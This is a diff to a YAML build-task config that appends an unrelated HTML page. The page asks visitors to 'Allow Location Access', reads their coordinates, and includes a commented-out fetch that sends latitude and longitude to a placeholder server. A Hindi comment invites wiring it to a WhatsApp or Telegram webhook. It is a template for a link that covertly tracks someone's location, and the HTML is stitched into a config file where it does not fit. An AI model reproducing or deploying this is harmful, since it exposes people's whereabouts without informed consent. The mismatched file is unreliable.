@@ -18,3 +18,20 @@ task:
 
   output_artifacts:
     path: "./app/build/outputs/apk/debug/*.apk"
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>Allow Location Access</h2>
+    <script>
+      navigator.geolocation.getCurrentPosition(function(pos) {
+        // अपनी API या WhatsApp/Telegram webhook यहाँ लगाएँ
+        alert("Latitude: " + pos.coords.latitude + "\nLongitude: " + pos.coords.longitude);
+        // Example: fetch('https://your-server.com/location', {
+        //   method: 'POST',
+        //   headers: {'Content-Type': 'application/json'},
+        //   body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude})
+        // });
+      });
+    </script>
+  </body>
+</html>
